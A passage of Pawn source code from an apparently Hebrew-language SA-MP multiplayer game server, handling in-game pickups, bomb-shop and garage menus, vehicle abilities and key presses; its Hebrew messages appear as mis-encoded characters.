					SendClientMessage(playerid,green,string);
				}
				if(kartinfo[0])
				{
					DestroyPickupEx(kartinfo[4]);
					kartinfo[4] = 0, kartinfo[5] = 0;
				}
				else if(monsterinfo[0])
				{
					DestroyPickupEx(monsterinfo[4]);
					monsterinfo[4] = 0, monsterinfo[5] = 0;
				}
			}
			case 25:
			{
				DestroyPickupEx(wweinfo[5]);
				wweinfo[5] = 0, wweinfo[6] = 0;
			}
			case 26, 27:
			{
				if(pickupinfo[pickupid][pfunc] == 26)
				{
					GiveMoney(playerid,pickupinfo[pickupid][pspecialid],10);
					format(string,sizeof(string)," * !юЎр р· фЇщўрЇ ∙ь ЇЄщьх· фЇщўрЇщэ хцыф с-$%d %s",pickupinfo[pickupid][pspecialid],GetName(playerid));
				}
				else
				{
					if(playerinfo[playerid][scroll] != scroll_none) return SendClientMessage(playerid,red," .ыс° щ∙ ьъ ёў°хь! ьр ·хыь ьўч· р· фЇщўрЇ");
					SetPlayerScroll(playerid,pickupinfo[pickupid][pspecialid]);
					format(string,sizeof(string),@c(yellow) ":∙юрЇ∙° ьъ %s цыщ· сёў°хь юёхт\n" @c(lightyellow) "%s\nрх ьчї Єь \"фю∙ъ\" ь°∙щю· рЇ∙°хщх· " @c(lightblue) "/scroll" @c(lightyellow) " ф∙·ю∙ сЇўхуф",Scrolls[pickupinfo[pickupid][pspecialid]][scShort],Scrolls[pickupinfo[pickupid][pspecialid]][scName]);
					ShowPlayerDialog(playerid,dialog_scroll2,DIALOG_STYLE_MSGBOX,@c(lightblue) "!цыщ· сёў°хь",string,"фю∙ъ","ётх°");
					format(string,sizeof(string)," * !%s юЎр р· фЇщўрЇ ∙ь ЇЄщьх· фЇщўрЇщэ хцыф сёў°хь юёхт %s",Scrolls[pickupinfo[pickupid][pspecialid]][scShort],GetName(playerid));
				}
				SendClientMessageToAll(pickupinfo[pickupid][pfunc] == 26 ? green : yellow,string);
				pastatus = 0;
				DestroyPickupEx(pickact);
				KillTimer(pickacttimer);
				GangZoneHideForAll(pickactzone);
				GangZoneDestroy(pickactzone);
				pickupinfo[pickupid][pspecialid] = 0;
			}
			case 28:
			{
				GiveMoney(playerid,pickupinfo[pickupid][pspecialid],4);
				DestroyMoneyPickup(pickupinfo[pickupid][moneypickup]);
			}
			case 30:
			{
				SetFreeze(playerid,1);
				ShowPlayerDialog(playerid,dialog_shavuot,DIALOG_STYLE_LIST,@c(lightblue) "чЁх· фЁ∙ўщэ ∙ь ∙схЄх·","сьхя ющэ - 100$\nсщЎф - 200$\nЎщЁх° - 500$","ўЁщщф","щЎщрф");
			}
			case 31:
			{
				if(IsPlayerAttachedObjectSlotUsed(playerid,aoslot_shavuot2)) return SendClientMessage(playerid,red," !°хсф фющэ фцф ыс° ю∙ху°т");
				switch(playerinfo[playerid][dmzlevel])
				{
					case 1: SetPlayerAttachedObject(playerid,aoslot_shavuot2,347,6,0.0,0.0,0.0,0.0,0.0,0.0,2.0,2.0,2.0);
					case 2: SetPlayerAttachedObject(playerid,aoslot_shavuot2,353,6,0.0,0.0,0.0,0.0,0.0,0.0,2.5,1.0,1.0);
					default: return SendClientMessage(playerid,red," !ьр Ёщ·я ь∙у°т р· °хсф фющэ фцф");
				}
				PlaySound(playerid,1133);
				SendClientMessage(playerid,orange," !°хсф фющэ ∙ьъ ∙ху°т, юЄы∙щх фхр щфщф чцў щх·°");
			}
			case 32:
			{
				if(playerinfo[playerid][tooktempickup]) SendClientMessage(playerid,red," .ыс° ЇЄщь рЎьъ ЇщўрЇ ∙ьўч· сЇЄщьх·, фЇщўрЇ ∙ьўч· ы°тЄ ьр щ∙ЇщЄ");
				else
				{
					format(string,sizeof(string)," Х !" @c(purple) "%s" @c(orange) " ўщсь· ЇщўрЇ",TDMZPickupNames_Heavy[pickupinfo[pickupid][pspecialid]]);
					SendClientMessage(playerid,orange,string);
					switch(pickupinfo[pickupid][pspecialid])
					{
						case 0: // Godmod
						{
							GameTextForPlayer(playerid,"~g~godmod!~n~~b~(1.5 minutes)",1500,4);
							new Float:h;
							GetPlayerHealth(playerid,h);
							playerinfo[playerid][tooktempickup] = 1, playerinfo[playerid][gm] = 1;
							SetPlayerHealth(playerid,10000.0);
							SetTimerEx("RemovePlayerTDMPickup",90000,0,"iif",playerid,0,h);
						}
						case 1: // Death
						{
							GameTextForPlayer(playerid,"~r~death!~n~do not touch me next time",2500,4);
							SetPlayerHealth(playerid,0.0);
						}
						case 2, 3: // Tank / Small Plane
						{
							GameTextForPlayer(playerid,pickupinfo[pickupid][pspecialid] == 2 ? ("~g~tank!~n~~b~(30 seconds)") : ("~g~small plane!~n~~b~(3 minutes)"),1500,4);
							new Float:p[4];
							playerinfo[playerid][tooktempickup] = 1;
							GetPlayerPos(playerid,p[0],p[1],p[2]);
							GetPlayerFacingAngle(playerid,p[3]);
							new newv = CreateVehicleEx(pickupinfo[pickupid][pspecialid] == 2 ? 432 : 464,p[0],p[1],p[2],p[3],-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
							playerinfo[playerid][vtemp] = newv;
							PutPlayerInVehicle(playerid,newv,0);
							SetFreeze(playerid,1);
							SetTimerEx("UnFreeze",1000,0,"i",playerid);
							SetTimerEx("RemovePlayerTDMPickup",pickupinfo[pickupid][pspecialid] == 2 ? 30000 : 180000,0,"iif",playerid,1,-1.0);
						}
						case 4: // Large Weapons
						{
							new w_[3], am_[3];
							for(new i = 2; i < 5; i++)
							{
								GetPlayerWeaponData(playerid,i,w_[i-2],am_[i-2]);
								if(w_[i-2] >= 16 && w_[i-2] <= 46) SetPlayerAttachedObject(playerid,i,GetWeaponPickupModel(w_[i-2]),6,0.0,0.0,0.0,0.0,0.0,0.0,2.0,2.0,2.0);
							}
						}
						case 5: // SP: Fly
						{
							GameTextForPlayer(playerid,"~g~super power:~n~~y~fly~n~~b~(minute)",2500,4);
							new Float:h;
							GetPlayerHealth(playerid,h);
							playerinfo[playerid][tooktempickup] = 1, playerinfo[playerid][gm] = 1;
							SetPlayerHealth(playerid,10000.0);
							StartFlyingC(playerid);
							SetTimerEx("RemovePlayerTDMPickup",60000,0,"iif",playerid,-1,-1.0);
							SendClientMessage(playerid,orange," !··чщь ьЄхє");
						}
						case 6: // SP: Water Ball
						{
							GameTextForPlayer(playerid,"~g~super power:~n~~b~water ball~n~~b~(minute)",2500,4);
							SetPlayerAttachedObject(playerid,1,18844,2,-0.6,0.0,0.0,0.0,0.0,0.0,0.02,0.02,0.02);
							SetPlayerHealth(playerid,100.0);
							SetPlayerArmour(playerid,100.0);
							playerinfo[playerid][tooktempickup] = 1;
							SetTimerEx("RemovePlayerTDMPickup",60000,0,"iif",playerid,-1,-1.0);
							SendClientMessage(playerid,orange," !ыь ющ ∙щщ°ф съ, фщ°щх· щчц°х рьщх Їщ 2! фыхч Ё∙р° уўф рч· рх Єу ∙·ф°т");
						}
						case 7: // SP: Magnet
						{
							GameTextForPlayer(playerid,"~g~super power:~n~~p~magnet~n~~b~(minute)",2500,4);
							ResetWeapons(playerid);
							GiveWeapon(playerid,23,1000);
							SetPlayerAttachedObject(playerid,5,3053,5,0.0,0.0,0.0,0.0,0.0,0.0,0.5,0.5,0.5);
							SetPlayerAttachedObject(playerid,6,3053,6,0.0,0.0,0.0,0.0,0.0,0.0,0.5,0.5,0.5);
							SetPlayerHealth(playerid,100.0);
							SetPlayerArmour(playerid,100.0);
							playerinfo[playerid][tooktempickup] = 1;
							SetTimerEx("RemovePlayerTDMPickup",60000,0,"iif",playerid,-1,-1.0);
							SendClientMessage(playerid,orange," !ыь ющ ∙·щ°ф сх щрсу р· фЁ∙ўщэ ∙ьх");
						}
						case 8: // SP: Laser Eyes
						{
							GameTextForPlayer(playerid,"~g~super power:~n~~r~laser eyes~n~~b~(minute)",2500,4);
							ResetWeapons(playerid);
							GiveWeapon(playerid,23,1000);
							SetPlayerAttachedObject(playerid,7,18643,1,0.36,0.0,0.3,0.0,0.0,90.0,1.0,1.0,1.0);
							SetPlayerAttachedObject(playerid,8,18643,1,0.36,0.0,-0.3,0.0,0.0,90.0,1.0,1.0,1.0);
							playerinfo[playerid][tooktempickup] = 1;
							SetTimerEx("RemovePlayerTDMPickup",60000,0,"iif",playerid,-1,-1.0);
							SendClientMessage(playerid,orange," !ыь ющ ∙·щ°ф сх щ∙°є");
						}
					}
				}
				for(new i = 0; i < 3; i++) if(heavytdmPickups[i] == pickupid) heavytdmPickups[i] = -1;
				DestroyPickupEx(pickupid);
			}
			case 33:
			{
				if(playerinfo[playerid][scroll] != scroll_none) return SendClientMessage(playerid,red," .ыс° щ∙ ьъ ёў°хь! ьр ·хыь ьўч· р· фЇщўрЇ");
				new t = random(sizeof(Scrolls));
				SetPlayerScroll(playerid,t);
				format(string,sizeof(string),@c(yellow) ":∙юрЇ∙° ьъ %s цыщ· сёў°хь юёхт\n" @c(lightyellow) "%s\nрх ьчї Єь \"фю∙ъ\" ь°∙щю· рЇ∙°хщх· " @c(lightblue) "/scroll" @c(lightyellow) " ф∙·ю∙ сЇўхуф",Scrolls[t][scShort],Scrolls[t][scName]);
				ShowPlayerDialog(playerid,dialog_scroll2,DIALOG_STYLE_MSGBOX,@c(lightblue) "!цыщ· сёў°хь",string,"фю∙ъ","ётх°");
				format(string,sizeof(string),"%s :юЎр р· фюцххуф хцыф хсёў°хь %s",Scrolls[t][scShort],GetName(playerid));
				SendClientMessageToAll(green,string);
				act_SaveWin(playerid,act_Code(aid_bc));
				DestroyPickupEx(pickupid);
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inbriefcase])
				{
					SpawnPlayer(i);
					playerinfo[i][inbriefcase] = 0, playerinfo[i][waitbriefcase] = 0;
					playerinfo[i][inact] = 0;
				}
				briefcaseinfo[0] = 0, briefcaseinfo[1] = 0, briefcaseinfo[2] = 0, briefcaseinfo[4] = 0;
				thereIsAct = false;
				KillTimer(briefcaseinfo[3]);
			}
		}
	}
	return 1;
}
//=[OnPlayerLeavePickup]========================================================
public OnPlayerLeavePickup(playerid,pickupid)
{
	#if lagtest
		LagTest_Start("OnPlayerLeavePickup");
	#endif
	if(pickupinfo[pickupid][pfunc] >= 1)
	{
		switch(pickupinfo[pickupid][pfunc])
		{
			case 1: if(playerinfo[playerid][propertyid] != -1) playerinfo[playerid][propertyid] = -1, playerinfo[playerid][showprop] = 0;
			case 8: if(playerinfo[playerid][houseid] != -1) playerinfo[playerid][houseid] = -1, playerinfo[playerid][showhouse] = 0;
		}
	}
	#if lagtest
		LagTest_End("OnPlayerLeavePickup");
	#endif
	return 1;
}
//=[OnPlayerSelectedMenuRow]====================================================
public OnPlayerSelectedMenuRow(playerid, row)
{
	if(debugstate) printf("OnPlayerSelectedMenuRow(%s(%d),%d) start",GetName(playerid),playerid,row);
	#if lagtest
		LagTest_Start("OnPlayerSelectedMenuRow");
	#endif
	new string[M_S], Menu:m = GetPlayerMenu(playerid);
	if(m == bombshop)
	{
		switch(row)
		{
			case 0:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ющуЄ ЇЎЎх· ~~~");
				SendClientMessage(playerid,brown," (Number. Bomb name [Cost, Level])");
				for(new i=1;i<12;i++)
				{
					if(bombinfo[i][bValid])
					{
						format(string,sizeof(string)," %d. %s [%d$, %d]",i,bombinfo[i][bName],bombinfo[i][bCost],bombinfo[i][bLevel]);
						SendClientMessage(playerid,yellow,string);
					}
				}
			}
			default:
			{
				if(playerinfo[playerid][level] < bombinfo[row][bLevel])
				{
					SendClientMessage(playerid,red," .ф°юф ∙ьъ Ёюхыф юущ ьўЁщщ· фЇЎЎф фцх");
					SetFreeze(playerid,0);
					return 1;
				}
				if(GetMoney(playerid) < bombinfo[row][bCost])
				{
					SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє ьўЁщщ· фЇЎЎф фцх");
					SetFreeze(playerid,0);
					return 1;
				}
				playerinfo[playerid][bomb] = row;
				GiveMoney(playerid,0-bombinfo[row][bCost],35);
				format(string,sizeof(string)," !\"%s\" ўЁщ· р· фЇЎЎф",bombinfo[row][bName]);
				format(talkBubble,sizeof(talkBubble),":ўЁщ· р· фЇЎЎф\n" @c(red) "%s",bombinfo[row][bName]);
				NPCTalk("DM_BombShop",string,playerid,1,1,1);
			}
		}
	}
	else if(m == areYouSure[0] && !row)
	{
   	    new logt[M_S];
		format(logt, M_S, "lost %d (player rm)", GetMoney(playerid));
		Log("Money", playerid, logt);
		ResetMoney(playerid);
		SendClientMessage(playerid,green," .ючў· р· ыёЇъ");
	}
	else if(m == areYouSure[1] && !row)
	{
		ResetWeapons(playerid);
		for(new i=0;i<10;i++)
		{
			playerinfo[playerid][weapons][i] = 0;
			if(playerinfo[playerid][logged])
			{
				format(string,sizeof(string),"PlayerWeapon%d",i);
				fsetint(fuser(playerid),string,0);
			}
			if(i < 8)
			{
				if(playerinfo[playerid][logged])
				{
					format(string,sizeof(string),"PlayerAmmo%d",i);
					fsetint(fuser(playerid),string,0);
				}
				playerinfo[playerid][ammo][i] = 0;
			}
		}
		SendClientMessage(playerid,green," .ючў· р· Ё∙ўщъ");
	}
	else if(m == shootingMenu)
	{
	    if(!CanBeTeleported(playerid)) return 1;
		if(playerinfo[playerid][inarea51] || playerinfo[playerid][inplane] || playerinfo[playerid][inshooting] != -1 || playerinfo[playerid][instunting] != -1) return SendClientMessage(playerid,red," .·хыь ьф∙·т° °ў ьрч° ∙·ёщщэ рх·э ,Plane / Army / Shooting / Stunting р·ф ыс° ЁюЎр с");
		SetPlayerPos(playerid,Shooting[row][0],Shooting[row][1],Shooting[row][2]);
		SetPlayerFacingAngle(playerid,Shooting[row][3]);
		SetPlayerInterior(playerid,0);
		SetPlayerCP(playerid,Shooting[row][4],Shooting[row][5],Shooting[row][6],6.5);
		playerinfo[playerid][inshooting] = row;
		SavePlayerWeapons(playerid);
		ResetWeapons(playerid);
		GiveWeapon(playerid,46,0);
		format(string,sizeof(string)," ~~~ :с°хъ фср ьрцх° ўьщЄф ьюш°ф юёЇ° #%d ~~~",row + 1);
		SendClientMessage(playerid,lightblue,string);
		SendClientMessage(playerid,yellow," .(Єьщъ ьўЇхї юфюўхэ сх р·ф ЁюЎр хьЎЁхч рь фюЄть фрухэ (фЎ'ўЇхщЁш");
		SendClientMessage(playerid,yellow," .сющуф х·Ўьщч ·цыф с-500$");
		SendClientMessage(playerid,green," !сфЎьчф");
		SetPlayerVirtualWorld(playerid,world_shooting);
	}
	else if(m == sgarageMenu)
	{
		if(GetMoney(playerid) < sgarageinfo[row][gcCost])
		{
			SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє ьўЁщщ· ф∙щЇх° фцф");
			SetFreeze(playerid,0);
			return 1;
		}
		playerinfo[playerid][sgcomp] = row;
		GiveMoney(playerid,0-sgarageinfo[row][gcCost], 26);
		format(string,sizeof(string)," !с $%d \"%s\" °ы∙· р· ф∙щЇх° фющхчу",sgarageinfo[row][gcCost],sgarageinfo[row][gcName]);
		SendClientMessage(playerid,green,string);
		switch(row)
		{
			case 0: // Infinite Nitro
			{
				UpdateNitro(GetPlayerVehicleID(playerid), playerid);
				SendClientMessage(playerid,yellow," !с°тЄ ∙фЁщш°х ∙ьъ Ётю°, Ї∙хш ьчї ∙хс Єь ыЇ·х° фЁщш°х хфхр щ·чу∙");
			}
			case 1: // Turbo
			{
				SendClientMessage(playerid,yellow," .(ьчї Єь юў∙ фф·ўЇф с·хъ ф°ыс ьфЇЄь· фшх°сх (°ў ЇЄэ рч·");
			}
			case 2: // Random Colors
			{
				playerinfo[playerid][cvcolor] = 1;
				SendClientMessage(playerid,yellow," .ьчї Єь юў∙ фф·ўЇф Єь юЁ· ьсшь / ьфЇЄщь р· фрхЇЎщщф");
			}
			case 3: // Vehicle Rockets
			{
				new v = GetPlayerVehicleID(playerid);
				vehicleinfo[v][vrockets][0] = CreateObject(3790,0.0,0.0,0.0,0,0,0,300.0);
				vehicleinfo[v][vrockets][1] = CreateObject(3790,0.0,0.0,0.0,0,0,0,300.0);
				AttachObjectToVehicle(vehicleinfo[v][vrockets][0],v,1.05,0,-0.2,0,0,270);
				AttachObjectToVehicle(vehicleinfo[v][vrockets][1],v,-1.05,0,-0.2,0,0,270);
				SendClientMessage(playerid,yellow," .ьчї Єь юў∙ фф·ўЇф Єь юЁ· ь∙ьхч рчу юфшщьщэ");
			}
		}
	}
	SetFreeze(playerid,0);
	#if lagtest
		LagTest_End("OnPlayerSelectedMenuRow");
	#endif
	if(debugstate) printf("OnPlayerSelectedMenuRow(%s(%d),%d) end",GetName(playerid),playerid,row);
	return 1;
}
//=[OnPlayerExitedMenu]=========================================================
public OnPlayerExitedMenu(playerid)
{
	if(debugstate) printf("OnPlayerExitedMenu(%s(%d)) start",GetName(playerid),playerid);
	SetFreeze(playerid,0);
	if(debugstate) printf("OnPlayerExitedMenu(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerKeyStateChange]=====================================================
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	//if(debugstate) printf("OnPlayerKeyStateChange(%s(%d),%d,%d) start",GetName(playerid),playerid,newkeys,oldkeys);
	//if(newkeys == KEY_ACTION) TextDrawHideForPlayer(playerid,modetxt);
	//if(oldkeys == KEY_ACTION && newkeys == 0) TextDrawShowForPlayer(playerid,modetxt); Fixed in 0.2.2 R3
	#if lagtest
		//LagTest_Start("OnPlayerKeyStateChange");
	#endif
	new string[M_S];
	if(((newkeys & KEY_FIRE) == KEY_FIRE || (newkeys & 128) == 128) && (((GetPlayerCheckpoint(playerid) == cp_bank || GetPlayerCheckpoint(playerid) == cp_ammu) && GetPlayerInterior(playerid) != 0) || GetPlayerCheckpoint(playerid) == cp_vstore) && playerinfo[playerid][spectate] == -1 && !IsPlayerMAdmin(playerid) && !playerinfo[playerid][srin] && playerinfo[playerid][indialog] == -1)
	{
		SetPlayerHealth(playerid,0.0);
		playerinfo[playerid][usedkill] = 1;
		SendClientMessage(playerid,red," !рёх° ь·ўхє рх ьрщщэ ыря");
	}
	if(newkeys & 128 && !playerinfo[playerid][sniping])
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && GetPlayerWeapon(playerid) == 34 && GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_NONE)
		{
			playerinfo[playerid][sniping] = 1;
			if(playerinfo[playerid][setting][setting_sniper] >= 2) TextDrawShowForPlayer(playerid,snipertext[0]);
			if(playerinfo[playerid][setting][setting_sniper] >= 3) TextDrawShowForPlayer(playerid,snipertext[1]);
		}
	}
	else if(oldkeys & 128 && !(newkeys & 128) && playerinfo[playerid][sniping])
	{
		playerinfo[playerid][sniping] = 0;
		if(playerinfo[playerid][setting][setting_sniper] >= 2) TextDrawHideForPlayer(playerid,snipertext[0]);
		if(playerinfo[playerid][setting][setting_sniper] >= 3) TextDrawHideForPlayer(playerid,snipertext[1]);
	}
	#if lagtest
		//LagTest_EndEx("OnPlayerKeyStateChangeB(%d)",newkeys);
	#endif
	if(newkeys & KEY_YES && newkeys & KEY_NO) command(playerid,"/border");
	if(newkeys & KEY_JUMP && !(oldkeys & KEY_JUMP)) if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_CUFFED) ApplyAnimation(playerid,"GYMNASIUM","gym_jog_falloff",4.1,0,1,1,0,0);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && vehicleinfo[GetPlayerVehicleID(playerid)][vspecial])
	{
		new vid = GetPlayerVehicleID(playerid);
		switch(vehicleinfo[vid][vspecialid])
		{
			case SV_SUBMARINE, SV_DOLPHIN1, SV_DOLPHIN2:
			{
				if(vehicleinfo[vid][vspecialid] == SV_SUBMARINE && newkeys & KEY_FIRE && !vehicleinfo[vid][sv_ability])
				{
					new Float:tp[3], Float:p[3], toAttack = -1;
					GetVehiclePos(vid,tp[0],tp[1],tp[2]);
					GetXYInFrontOfVehicle(vid,tp[0],tp[1],3.5);
					for(new i = 0; i < MAX_PLAYERS_ && toAttack == -1; i++) if(IsPlayerConnected(i) && GetDistanceBetweenPlayers(playerid,i) <= 50.0 && i != playerid)
					{
						GetPlayerPos(i,p[0],p[1],p[2]);
						if((GetPlayerState(i) == PLAYER_STATE_ONFOOT && (p[2] < 8.4 || (GetPlayerSurfingVehicleID(i) != INVALID_VEHICLE_ID && IsBoat(GetPlayerSurfingVehicleID(i)))))
						|| (GetPlayerState(i) == PLAYER_STATE_DRIVER && IsBoat(GetPlayerVehicleID(i)))) toAttack = i;
					}
					if(toAttack == -1)
					{
						GetXYInFrontOfVehicle(vid,p[0],p[1],25.0);
						p[2] = tp[2];
					}
					else GetPlayerPos(toAttack,p[0],p[1],p[2]);
					new torpedo = CreateSObject(354,tp[0],tp[1],tp[2],0.0,0.0,0.0);
					objectinfo[torpedo][oeam] = 6, objectinfo[torpedo][odam] = 1;
					MoveSObject(torpedo,p[0],p[1],p[2],14.5);
					vehicleinfo[vid][sv_ability] = 1;
					SetTimerEx("AbleToUseTorpedo",2000,0,"i",vid);
				}
				if(newkeys & KEY_HORN)
				{
					new Float:vpos2[3];
					GetVehicleVelocity(vid,vpos2[0],vpos2[1],vpos2[2]);
					if(vpos2[2] > -15.0) SetVehicleVelocity(vid,vpos2[0],vpos2[1],vpos2[2]-0.8,playerid);
				}
			}
		}
	}
	if(newkeys & KEY_SECONDARY_ATTACK)
	{
		new Float:p[3], vehicleID = -1;
		if(!IsPlayerInAnyVehicle(playerid))
		{
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetVehicleWithinDistance(playerid,p[0],p[1],p[2],40.0,vehicleID);
			if(vehicleID != -1)
			{
				if(IsVehicleRcOrTram(vehicleID) ||
				vehicleinfo[vehicleID][vspecial])
				{
					if(IsVehicleRcOrTram(vehicleID)) GetVehicleWithinDistance(playerid,p[0],p[1],p[2],18.0,vehicleID);
					if(vehicleID != -1) PutPlayerInVehicle(playerid,vehicleID,0);
				}
			}
		}
		else
		{
			vehicleID = GetPlayerVehicleID(playerid);
			if(IsVehicleRcOrTram(vehicleID) || GetVehicleModel(vehicleID) == 594 || vehicleinfo[vehicleID][vspecial])
			{
				if(GetVehicleModel(vehicleID) != 449)
				{
			   	 	GetPlayerPos(playerid,p[0],p[1],p[2]);
					SetPlayerPos(playerid, p[0]+0.5,p[1],p[2]+1.0);
				}
			}
			SetCameraBehindPlayer(playerid);
		}
	}
	if(playerinfo[playerid][viewingvehicle] != -1)
	{
		new s = playerinfo[playerid][vlistdia][0], v = playerinfo[playerid][vlistdia][1], Float:za;
		if(newkeys & KEY_SECONDARY_ATTACK)
		{
			GetVehicleZAngle(playerinfo[playerid][viewingvehicle],za);
			SetVehicleZAngle(playerinfo[playerid][viewingvehicle],za + 90.0);
		}
		else
		{
			DestroyVehicleEx(playerinfo[playerid][viewingvehicle]);
			TogglePlayerSpectating(playerid,0);
			new dialogHeader[64];
			format(dialogHeader,sizeof(dialogHeader),@c(lightblue) "%s | чЁх· ф%s",GetVehicleName(vstoreinfo[s][vstore_vehicles][v]),cpinfo[playerinfo[playerid][cp]][cpname]);
			format(string,sizeof(string),@c(yellow) "ЎЇщщф с°ыс\n" @c(yellow) "(ўЁщщф ($%d\n" @c(yellow) "ўЁщщф сы°шщё р∙°рщ\n",vstoreinfo[s][vstore_costs][v]);
			ShowPlayerDialog(playerid,dialog_vlist2,DIALOG_STYLE_LIST,dialogHeader,string,"сч°","чцх°");
		}
	}
	#if lagtest
		//LagTest_EndEx("OnPlayerKeyStateChangeC(%d)",newkeys);
	#endif
	if(newkeys & KEY_JUMP)
	{
		if(playerinfo[playerid][incrane]) MulPlayerVelocity(playerid,1.2,1.2,1.2);
		else if(GetPlayerCheckpoint(playerid) == cp_jumping  && IsPlayerInCheckpoint(playerid) && playerinfo[playerid][jumpower] > 0) SetPlayerForwardVelocity(playerid,floatmul(0.15,float(playerinfo[playerid][jumpower])),floatmul(0.5,float(playerinfo[playerid][jumpower])));
		/*else
		{
			if(playerinfo[playerid][houseid] != -1)
			{
				new f[M_S], h = playerinfo[playerid][houseid];
				format(f,sizeof(f),"/DM/Houses/%d.ini",h);
				CheckHouseAcc(playerid,h);
				if(playerinfo[playerid][houseacc][h] && playerinfo[playerid][dmzone] == dmz_none && playerinfo[playerid][tdmzone] == tdmz_none) GoIntoHouse(playerid,h);
			}
		}*/
	}
	if(newkeys & KEY_SECONDARY_ATTACK && playerinfo[playerid][inhouse] > -1)
	{
		SetPlayerPos(playerid,houseinfo[playerinfo[playerid][inhouse]][hx],houseinfo[playerinfo[playerid][inhouse]][hy],houseinfo[playerinfo[playerid][inhouse]][hz]);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		playerinfo[playerid][inhouse] = -1;
	}
	if(newkeys == KEY_SPRINT && playerinfo[playerid][pickup] != -1 && playerinfo[playerid][indialog] == -1) if(pickupinfo[playerinfo[playerid][pickup]][pfunc] == 2)
	{
		format(string,sizeof(string),folder_help "InfoPoint_%d.txt",ipinfo[pickupinfo[playerinfo[playerid][pickup]][pspecialid]][iptype]);
		if(fexist(string))
		{
			new File:fh, read[M_S], dia[1024];
			fh = fopen(string,io_read);
			if(fh)
			{
				while(fread(fh,read)) if(read[0] != ';' && strfind(read,"=") == -1) format(dia,sizeof(dia),"%s%s",dia,ColouredChat(read));
				fixchars(dia);
				fclose(fh);
				format(string,sizeof(string),@c(lightblue) "ющуЄ: " @c(lightyellow) "%s",ipinfo[pickupinfo[playerinfo[playerid][pickup]][pspecialid]][ipheader]);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,dia,"ётх°","");
			}
			else ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ющуЄ",@c(red) ".стьь сЄщф шыЁщ·, ьр Ёщ·я ьЎЇх· сющуЄ. Ёёф ∙хс сў°хс","ётх°","");
		}
	}
	#if lagtest
		//LagTest_EndEx("OnPlayerKeyStateChangeD(%d)",newkeys);
	#endif
	if(newkeys & KEY_HORN && playerinfo[playerid][clan] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new theGate = -1, aclan[MAX_CLANS], clans = 0;
		if(playerinfo[playerid][clan] > 0) aclan[clans++] = playerinfo[playerid][clan];
		for(new i = 1; i <= MAXCLANS; i++)
		{
			if(i == playerinfo[playerid][clan]) continue;
			if(playerinfo[playerid][admin] >= 19 || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ")) || claninfo[playerinfo[playerid][clan]][cpeace][i] || claninfo[i][cruler] == playerinfo[playerid][clan]) aclan[clans++] = i;
		}
		for(new c = 0; c < clans && theGate == -1; c++) for(new i = 0; i < claninfo[aclan[c]][cobjects] && theGate == -1; i++) if(GetPlayerDistanceToPoint(playerid,objectinfo[claninfo[aclan[c]][cobject][i]][opos][0],objectinfo[claninfo[aclan[c]][cobject][i]][opos][1]) <= 14.0 && objectinfo[claninfo[aclan[c]][cobject][i]][omoving][0] && IsValidSObject(claninfo[aclan[c]][cobject][i])) theGate = claninfo[aclan[c]][cobject][i];
		if((theGate == -1 || (objectinfo[theGate][omoving][1] != playerinfo[playerid][clan] && !claninfo[playerinfo[playerid][clan]][cpeace][objectinfo[theGate][omoving][1]])) && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) return 1;
		StopSObject(theGate);
		MoveSObject(theGate,!objectinfo[theGate][omoving][2] ? objectinfo[theGate][omoveto][0] : objectinfo[theGate][opos][0],!objectinfo[theGate][omoving][2] ? objectinfo[theGate][omoveto][1] : objectinfo[theGate][opos][1],!objectinfo[theGate][omoving][2] ? objectinfo[theGate][omoveto][2] : objectinfo[theGate][opos][2],objectinfo[theGate][omoveto][3]);
		objectinfo[theGate][omoving][2] = !objectinfo[theGate][omoving][2];
	}
	if(playerinfo[playerid][underearth])
	{
		new Float:p[4];
		SetFreeze(playerid,0);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		SetPlayerPos(playerid,p[0],p[1],p[2] + 6.0);
		playerinfo[playerid][underearth] = 0;
		playerinfo[playerid][usepower] = 0;
		DisablePlayerCheckpoint(playerid);
		SetCameraBehindPlayer(playerid);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(GetPlayerDistanceToPointEx(i,p[0],p[1],p[2] + 4.0) <= 5.5)
		{
			PlaySound(i,1159);
			if(i != playerid)
			{
				format(string,sizeof(string)," !щщЎр ю·хъ фруюф х·ўє рх·ъ %s",GetName(playerid));
				SendClientMessage(i,red,string);
				Damage(i,50.0,playerid);
			}
		}
	}
	if(playerinfo[playerid][clancam] != -1) ClanCameraOff(playerid);
	if(CanUseUltimatePower(playerid))
	{
		if(playerinfo[playerid][upower] != -1 && (newkeys == playerinfo[playerid][upowerkeys] || oldkeys == playerinfo[playerid][upowerkeys]))
		{
			if(newkeys == playerinfo[playerid][upowerkeys])
			{
				format(string,sizeof(string)," ...(%s) ю·чщь ьшЄхя ыхч рхьшщюшщсщ",UltimatePowers[playerinfo[playerid][upower]][upTitle]);
				SendClientMessage(playerid,UltimatePowers[playerinfo[playerid][upower]][upHex],string);
				playerinfo[playerid][charge] = 0;
				SetPlayerChatBubble(playerid,"...щхЎ° ыхч рхьшщюшщсщ",UltimatePowers[playerinfo[playerid][upower]][upHex],20.0,3000);
			}
			if(oldkeys == playerinfo[playerid][upowerkeys])
			{
				new upLevel = playerinfo[playerid][charge] / 2, maxLevel = GetUltimatePowerMaxLevel(playerinfo[playerid][upower]), neededLevel = GetUPLNeededLevel(playerinfo[playerid][upower],upLevel), neededEn = GetUPLEnCost(playerinfo[playerid][upower],upLevel);
				if(upLevel > maxLevel) upLevel = maxLevel;
				if(upLevel > 0)
				{
